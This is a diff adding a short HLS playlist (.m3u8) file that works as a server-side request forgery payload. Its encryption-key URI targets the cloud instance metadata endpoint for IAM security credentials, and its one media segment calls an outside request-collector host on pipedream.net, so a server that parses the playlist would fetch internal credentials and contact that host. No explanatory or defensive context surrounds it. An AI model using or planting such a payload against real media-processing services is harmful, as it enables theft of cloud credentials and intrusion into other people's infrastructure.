@@ -1,0 +1,6 @@
+#EXTM3U
+#EXT-X-VERSION:3
+#EXT-X-KEY:METHOD=AES-128,URI="http://169.254.169.254/latest/meta-data/iam/security-credentials/",IV=0x00000000000000000000000000000000
+#EXTINF:10.0,
+https://eoow6y96ffo9mzx.m.pipedream.net/segment.ts
+#EXT-X-ENDLIST
